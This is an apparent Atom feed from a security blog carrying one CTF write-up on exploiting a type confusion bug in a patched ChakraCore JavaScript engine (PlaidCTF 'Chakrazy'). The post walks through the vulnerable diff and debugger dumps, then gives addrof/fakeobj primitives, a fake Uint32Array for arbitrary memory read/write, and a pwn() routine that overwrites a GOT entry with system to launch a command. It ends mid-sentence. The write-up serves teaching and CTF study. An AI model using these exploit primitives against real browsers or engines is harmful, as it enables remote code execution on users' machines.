<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hacking Tube 2.0</title>
  
  <subtitle>Security and stuff.</subtitle>
  <link href="//atom.xml" rel="self"/>
  
  <link href="https://bruce30262.github.io/"/>
  <updated>2018-02-23T16:02:07.686Z</updated>
  <id>https://bruce30262.github.io/</id>
  
  <author>
    <name>Bruce Chen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Chakrazy -- exploiting type confusion bug in ChakraCore engine</title>
    <link href="https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/"/>
    <id>https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/</id>
    <published>2017-12-26T03:12:00.000Z</published>
    <updated>2018-02-23T16:02:07.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ctftime.org/task/4088" target="_blank" rel="noopener">Chakrazy</a> is a browser CTF challenge created by team PPP for the <a href="https://ctftime.org/event/439" target="_blank" rel="noopener">2017 PlaidCTF event</a>. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You can download the challenge file <a href="https://drive.google.com/file/d/1aaDLRdl19ffT1-pn_9o4gNTcbR9kwypG/view?usp=sharing" target="_blank" rel="noopener">here</a>.</p><a id="more"></a><p>Similar to my <a href="https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/">previous post</a>, this post is more like a note about how I learn to exploit the type confusion vulnerability in the ChakraCore engine.</p><h2 id="Pre-knowledge"><a href="#Pre-knowledge" class="headerlink" title="Pre-knowledge"></a>Pre-knowledge</h2><p>It is recommanded that the reader have some basic knowledge about the type confusion bug and the internal data structures of the ChakraCore engine. Here are some slides from the <a href="http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf" target="_blank" rel="noopener">360Vulscan team</a> and <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf" target="_blank" rel="noopener">Natalie@Google Project Zero</a>. </p><h2 id="Environment-Setting"><a href="#Environment-Setting" class="headerlink" title="Environment Setting"></a>Environment Setting</h2><ul><li>Ubuntu Linux 16.04 64 bit</li><li><a href="https://github.com/Microsoft/ChakraCore/tree/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2" target="_blank" rel="noopener">ChakraCore@dd33b4ceaf4b38b44d279d13988ecbd31df46ed2</a></li><li>GEF debugger</li></ul><h2 id="Building-and-Debugging-the-ChakraCore-engine"><a href="#Building-and-Debugging-the-ChakraCore-engine" class="headerlink" title="Building and Debugging the ChakraCore engine"></a>Building and Debugging the ChakraCore engine</h2><p>Building the ChakraCore engine is simple, just follow the instructions in the <a href="https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore" target="_blank" rel="noopener">wiki page</a>. </p><p>For a Debug build:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ChakraCore</span><br><span class="line">git reset --hard dd33b4ceaf4b38b44d279d13988ecbd31df46ed2</span><br><span class="line">patch -p1 &lt; ../change.diff # apply the patch</span><br><span class="line">./build.sh --debug</span><br></pre></td></tr></table></figure><p>Later we’ll find the binaries in the <code>out/Debug</code> directory. If you want a Release build with debug symbols, you’ll have to modified the <code>CMakeLists.txt</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># At line 355</span><br><span class="line"></span><br><span class="line">if(NOT CMAKE_BUILD_TYPE STREQUAL Debug)</span><br><span class="line">-    add_compile_options(-O3)</span><br><span class="line">+    add_compile_options(-O0)</span><br><span class="line">+    add_compile_options(-finstrument-functions)</span><br><span class="line">+    add_compile_options(-g)</span><br><span class="line">+    add_compile_options(-ggdb)</span><br><span class="line">else()</span><br></pre></td></tr></table></figure><p>I modified the optimization flag to <code>O0</code> because the <code>O3</code> flag will optimized out the function parameter and causes some inconvenience during the debug process. </p><p>Here I chose to build the Release build with debug symbols, since it’s behavior is more close to the challenge binary ( which is a Release build with the <code>O3</code> optimization flag ). Later we can just use </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef --args out/Debug/ch exploit.js</span><br></pre></td></tr></table></figure><p>to debug the binary.</p><h2 id="Analyzing-the-Vulnerability-the-patch"><a href="#Analyzing-the-Vulnerability-the-patch" class="headerlink" title="Analyzing the Vulnerability ( the patch )"></a>Analyzing the Vulnerability ( the patch )</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/lib/Runtime/Library/JavascriptArray.cpp b/lib/Runtime/Library/JavascriptArray.cpp</span><br><span class="line">index a666b0b..0e8a073 100644</span><br><span class="line">--- a/lib/Runtime/Library/JavascriptArray.cpp</span><br><span class="line">+++ b/lib/Runtime/Library/JavascriptArray.cpp</span><br><span class="line">@@ -3151,12 +3151,6 @@ namespace Js</span><br><span class="line">             if (scriptContext-&gt;GetConfig()-&gt;IsES6IsConcatSpreadableEnabled())</span><br><span class="line">             &#123;</span><br><span class="line">                 spreadableCheckedAndTrue = JavascriptOperators::IsConcatSpreadable(aItem) != FALSE;</span><br><span class="line">-                if (!JavascriptNativeIntArray::Is(pDestArray))</span><br><span class="line">-                &#123;</span><br><span class="line">-                    ConcatArgs&lt;uint&gt;(pDestArray, remoteTypeIds, args, scriptContext, idxArg, idxDest, spreadableCheckedAndTrue);</span><br><span class="line">-                    return pDestArray;</span><br><span class="line">-                &#125;</span><br><span class="line">-</span><br><span class="line">                 if(!spreadableCheckedAndTrue)</span><br><span class="line">                 &#123;</span><br><span class="line">                     pDestArray-&gt;SetItem(idxDest, aItem, PropertyOperation_ThrowIfNotExtensible);</span><br></pre></td></tr></table></figure><p>The code is in the <a href="https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143" target="_blank" rel="noopener">JavascriptArray::ConcatIntArgs</a> function, where <code>pDestArray</code>‘s data type is <strong>“suppose”</strong> to be <code>JavascriptNativeIntArray</code>. </p><p>Here it <strong>removed the code that does the type checking of <code>pDestArray</code></strong>. There’s no need to do the type checking right ? Since <code>pDestArray</code> will always be <code>JavascriptNativeIntArray</code> isn’t it ? Well……</p><h2 id="Analyzing-the-Exploit"><a href="#Analyzing-the-Exploit" class="headerlink" title="Analyzing the Exploit"></a>Analyzing the Exploit</h2><p>We now start analyzing the challenge <a href="https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba" target="_blank" rel="noopener">exploit code</a> ( written by <a href="https://twitter.com/edgarboda" target="_blank" rel="noopener">eboda</a> ) and see how the exploit works. We’ll focus on the <code>addrof</code> and the <code>fakeobj</code> functions, since it’s the most important part of the entire exploit.</p><h3 id="addrof"><a href="#addrof" class="headerlink" title="addrof"></a>addrof</h3><p>The <code>addrof</code> function is used for leaking an object’s memory address. The most important part are the following code:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cons = <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">cons[<span class="built_in">Symbol</span>.species] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    qq = []; <span class="comment">// here qq is just a JavascriptNativeIntArray</span></span><br><span class="line">    <span class="keyword">return</span> qq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// using the species contructor allows us to get a handle on the result array</span></span><br><span class="line"><span class="comment">// of functions such as map() or concat()</span></span><br><span class="line">a.constructor = cons;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Here we define a custom getter for the Symbol.isConcatSpreadable property</span></span><br><span class="line"><span class="comment">// In it we change the type of qq by simply assigning an object to it</span></span><br><span class="line">fakeProp = &#123; <span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    b[<span class="number">1</span>] = obj;</span><br><span class="line">    qq[<span class="number">0</span>] = obj; <span class="comment">// qq was JavascriptNativeIntArray, now changed to JavascriptArray</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(b, <span class="built_in">Symbol</span>.isConcatSpreadable, fakeProp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger the vulnerability</span></span><br><span class="line"><span class="keyword">var</span> c = a.concat(b);</span><br></pre></td></tr></table></figure><p>When the line <code>var c = a.concat(b);</code> was executed, it will first call <a href="https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3437" target="_blank" rel="noopener">ArraySpeciesCreate()</a>, which in this case will return a <code>JavascriptNativeIntArray</code> ( line 2~9 ). Then it will goto <a href="https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3497" target="_blank" rel="noopener">line 3497</a> and call <a href="https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143" target="_blank" rel="noopener">ConcatIntArgs()</a>, our vulnerability function.</p><p>There’s a for loop inside the <code>ConcatIntArgs()</code> functions:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (uint idxArg = <span class="number">0</span>; idxArg &lt; args.Info.Count; idxArg++)</span><br><span class="line">&#123;</span><br><span class="line">    Var aItem = args[idxArg];</span><br><span class="line">    <span class="keyword">bool</span> spreadableCheckedAndTrue = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scriptContext-&gt;GetConfig()-&gt;IsES6IsConcatSpreadableEnabled())</span><br><span class="line">    &#123;</span><br><span class="line">        spreadableCheckedAndTrue = JavascriptOperators::IsConcatSpreadable(aItem) != FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!spreadableCheckedAndTrue)</span><br></pre></td></tr></table></figure><p>Here the <code>args</code> stores the array that will be concatenated to <code>pDestArray</code>. For instance:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = a.concat(b);</span><br><span class="line"><span class="comment">// here pDestArray = c</span></span><br><span class="line"><span class="comment">// args[0] = a</span></span><br><span class="line"><span class="comment">// args[1] = b</span></span><br></pre></td></tr></table></figure><p>According to the comments of the exploit:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Here we define a custom getter for the Symbol.isConcatSpreadable property</span></span><br><span class="line"><span class="comment">// In it we change the type of qq by simply assigning an object to it</span></span><br><span class="line">fakeProp = &#123; <span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    b[<span class="number">1</span>] = obj;</span><br><span class="line">    qq[<span class="number">0</span>] = obj; <span class="comment">// qq was JavascriptNativeIntArray, now changed to JavascriptArray</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set b's Symbol.isConcatSpreadable to fakeProp</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(b, <span class="built_in">Symbol</span>.isConcatSpreadable, fakeProp);</span><br></pre></td></tr></table></figure><p>So when <code>aItem</code> = <code>b</code> and ran to line <code>JavascriptOperators::IsConcatSpreadable(aItem)</code>, it will change <code>pDestArray</code>‘s data type from <code>JavascriptNativeIntArray</code> to <code>JavascriptArray</code>. It’ll also change <code>b</code>‘s data type into <code>JavascriptArray</code>, so later it can run to line <code>JavascriptNativeIntArray::ConvertToVarArray(pDestArray);</code>.</p><p>We can see that <a href="https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L1832" target="_blank" rel="noopener">JavascriptNativeIntArray::ConvertToVarArray</a>‘s first parameter is a <code>JavascriptNativeIntArray</code> data type. But here we pass a <code>JavascriptArray</code> data type variable instead, which leads to a <strong>type confusion</strong> vulnerability. </p><p>When <code>ConvertToVarArray(pDestArray)</code> was called, the <code>pDestArray</code> has the following memory layout:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tel 0x00007ffff03d8320</span><br><span class="line">0x00007ffff03d8320│+0x00: 0x0000000300000000</span><br><span class="line">0x00007ffff03d8328│+0x08: 0x0000000000000011</span><br><span class="line">0x00007ffff03d8330│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffff03d8338│+0x18: 0x00007ffff03d8140  &lt;-- dest[0]</span><br><span class="line">0x00007ffff03d8340│+0x20: 0x0001000000000001  &lt;-- dest[1]</span><br><span class="line">0x00007ffff03d8348│+0x28: 0x0001000000000002  &lt;-- dest[2]</span><br><span class="line">0x00007ffff03d8350│+0x30: 0x8000000280000002</span><br><span class="line">0x00007ffff03d8358│+0x38: 0x8000000280000002</span><br><span class="line">0x00007ffff03d8360│+0x40: 0x8000000280000002</span><br><span class="line">0x00007ffff03d8368│+0x48: 0x8000000280000002</span><br></pre></td></tr></table></figure><p>Here <code>dest[0]</code> stores the object’s address. Since the function “think” that <code>pDestArray</code> is a <code>JavscriptNativeIntArray</code>, it will take first three elements ( <code>0xf03d8140</code>, <code>0x7ffff</code> and <code>0x1</code> ) and convert them into the form of the <code>JavascriptArray</code> elements. After the conversion the memory layout will become something like:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tel 0x00007ffff03d83c0</span><br><span class="line">0x00007ffff03d83c0│+0x00: 0x0000000300000000</span><br><span class="line">0x00007ffff03d83c8│+0x08: 0x0000000000000011</span><br><span class="line">0x00007ffff03d83d0│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffff03d83d8│+0x18: 0x00010000f03d8140  &lt;-- dest[0] ( dest = c array )</span><br><span class="line">0x00007ffff03d83e0│+0x20: 0x0001000000007fff  &lt;-- dest[1]</span><br><span class="line">0x00007ffff03d83e8│+0x28: 0x0001000000000001  &lt;-- dest[2]</span><br></pre></td></tr></table></figure></p><p>Note that <code>dest[0]</code> and <code>dest[1]</code> now stores the value of the object’s address ( lower part and upper part ), thus we can leak the object’s memory address by combining <code>c[0]</code> &amp; <code>c[1]</code>. </p><h3 id="fakeobj"><a href="#fakeobj" class="headerlink" title="fakeobj"></a>fakeobj</h3><p>The goal of <code>fakeobj</code> is to fake a Javascript object at an arbitrary address. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a1 = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a2 = [lower(addr), upper(addr)]; <span class="comment">// addr = arbitrary address</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">c[<span class="built_in">Symbol</span>.species] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    new_array = [];</span><br><span class="line">    <span class="keyword">return</span> new_array;</span><br><span class="line">&#125;;</span><br><span class="line">a1.constructor = c;</span><br><span class="line"></span><br><span class="line">a2.__defineGetter__(<span class="built_in">Symbol</span>.isConcatSpreadable, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    new_array[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = a1.concat(a2);</span><br><span class="line"><span class="keyword">return</span> res[<span class="number">0x100</span>/<span class="number">2</span>]; <span class="comment">// res[128] = an object @ addr</span></span><br></pre></td></tr></table></figure><p>Here when <code>var res = a1.concat(a2);</code> was executed, the ChakraCore engine will ran to line <a href="https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3176" target="_blank" rel="noopener">3176</a>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool converted = CopyNativeIntArrayElements(pDestArray, idxDest, pItemArray);</span><br></pre></td></tr></table></figure><p>Here <code>pDestArray</code> is <strong>“suppose”</strong> to be a <code>JavscriptNativeIntAarray</code>, but again, we pass the argument as a <code>JavascriptArray</code> data type instead, causing the type confusion vulnerability.</p><p>Later the lower part and the upper part of the address ( <code>a2[0]</code> &amp; <code>a2[1]</code> ) will be appended into <code>pDestArray</code> ( in the form of <code>int32</code> ). The memory layout of <code>res</code> array will become:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.......................</span><br><span class="line">0x00007ffff02d8408│+0x10: 0x000100000000007e  &lt;-- res[126]</span><br><span class="line">0x00007ffff02d8410│+0x18: 0x000100000000007f  &lt;-- res[127]</span><br><span class="line">0x00007ffff02d8418│+0x20: 0x00007ffff03d84f0  &lt;-- res[128]</span><br></pre></td></tr></table></figure><p>Due to type confusion, now <code>res</code> will be treated as <code>JavascriptArray</code> and think that <code>res[128]</code> is an object ( which its address = <code>0x00007ffff03d84f0</code> ). By returning <code>res[128]</code> we now have the fake object’s handle.</p><h3 id="arbitrary-read-write-primitive"><a href="#arbitrary-read-write-primitive" class="headerlink" title="arbitrary read/write primitive"></a>arbitrary read/write primitive</h3><p>The exploit code first fake an <code>Uint32Array</code> object, then modify its data buffer’s pointer to obtain the arbitrary read/write primitive. To fake an <code>Uint32Array</code> object, it will need:</p><ul><li>Address of <code>Uint32Array</code>‘s vtable.</li><li>A pointer point to <code>0x30</code> ( <code>Uint32Array</code>‘s type id. Check <a href="https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Types/EdgeJavascriptTypeId.h" target="_blank" rel="noopener">this link</a> for more information )</li><li>A fake size</li><li>An <code>ArrayBuffer</code>‘s address</li><li>A fake data buffer pointer</li></ul><p>From the exploit code we can see it use <code>Array</code> to fake those data:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...................</span><br><span class="line"><span class="keyword">var</span> real = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> real_addr = addrof(real);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake vtable pointer</span></span><br><span class="line">real[<span class="number">0</span>] = lower(uint_vtable); </span><br><span class="line">real[<span class="number">1</span>] = upper(uint_vtable);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake type pointer</span></span><br><span class="line">real[<span class="number">2</span>] = lower(array_type);</span><br><span class="line">real[<span class="number">3</span>] = upper(array_type);</span><br><span class="line"></span><br><span class="line"><span class="comment">// dont care</span></span><br><span class="line">real[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">real[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">real[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">real[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake size</span></span><br><span class="line">real[<span class="number">8</span>] = <span class="number">0x1000</span>;</span><br><span class="line">real[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake ArrayBuffer pointer</span></span><br><span class="line">real[<span class="number">10</span>] = lower(ab_addr);</span><br><span class="line">real[<span class="number">11</span>] = upper(ab_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// dont care</span></span><br><span class="line">real[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">real[<span class="number">13</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>As for read/write primitive, it first assign the address in <code>real[14]</code> &amp; <code>real[15]</code> to modify the data buffer’s pointer, then use <code>fakeobj</code> to obtain the handle of the fake <code>Uint32Array</code> object:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the following creates an object which we will use to read and write</span></span><br><span class="line"><span class="comment">// memory arbitrarily</span></span><br><span class="line"><span class="keyword">var</span> memory = &#123;</span><br><span class="line">    handle: fakeobj(real_addr + <span class="number">0x58</span>), <span class="comment">// return fake object</span></span><br><span class="line">    init: <span class="function"><span class="keyword">function</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// we set the buffer pointer of the fake Uint32Array to the </span></span><br><span class="line">        <span class="comment">// target address</span></span><br><span class="line">        real[<span class="number">14</span>] = lower(addr);</span><br><span class="line">        real[<span class="number">15</span>] = upper(addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Now get a handle to the fake object!</span></span><br><span class="line">        <span class="keyword">return</span> memory.handle;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>Later it can just use the fake object handle to read/write the memory content.</p><h3 id="getting-shell"><a href="#getting-shell" class="headerlink" title="getting shell"></a>getting shell</h3><p>Here I modified the exploit code and use the same exploit method as the feuerfuchs challenge to get the shell:</p><ol><li>Leak the base address of <code>libChakraCore.so</code></li><li>Get the base address of <code>libc.so</code> by leaking <code>write@got.plt</code></li><li>Overwrite <code>memmove@got.plt</code> to <code>system</code></li><li>Execute <code>system([cmd])</code> by calling <code>Uint8Array.set()</code></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exploit the bug and create our arbitrary r/w primitive</span></span><br><span class="line">    <span class="keyword">var</span> mem = gimme_rw();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the base of libChakraCore.so                                                                                                                                                                     </span></span><br><span class="line">    <span class="keyword">var</span> base = get_base(mem);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] base @ "</span> + base.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the following offets are hardcoded</span></span><br><span class="line">    <span class="keyword">var</span> memmove_got = base + <span class="number">0xd9b0f0</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] memmove_got @ "</span> + memmove_got.toString(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">var</span> write_got = base + <span class="number">0xd9b780</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] write_got @ "</span> + write_got.toString(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">var</span> write_addr = mem.read64(write_got);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] write_addr @ "</span> + write_addr.toString(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">var</span> system = write_addr - <span class="number">0xe3a100</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] system @ "</span> + system.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now set up our command </span></span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="string">"/usr/bin/xcalc\0"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write the command into a Uint8Array</span></span><br><span class="line">    <span class="keyword">var</span> target = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x1234</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cmd.length; i++) &#123;</span><br><span class="line">        target[i] = cmd.charCodeAt(i);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite memmove with system</span></span><br><span class="line">    mem.write32(memmove_got, lower(system));</span><br><span class="line">    mem.write32(memmove_got+<span class="number">4</span>, upper(system));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GIMME SHELL NOW</span></span><br><span class="line">    <span class="keyword">var</span> bb = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">10</span>);</span><br><span class="line">    target.set(bb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The original exploit code overwrites two GOT entries ( <code>memmove</code> &amp; <code>memset</code> ) and tries to call <code>execve(&quot;/bin/sh&quot;, argv, envp)</code>, which is more complicated ( but more stable, since it doesn’t need to know the version of <code>libc.so</code> ). Here I choose a more simple way to achieve RCE.</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The patch removed the code that does the type checking inside the <code>JavascriptArray::ConcatIntArgs()</code> function. This make us 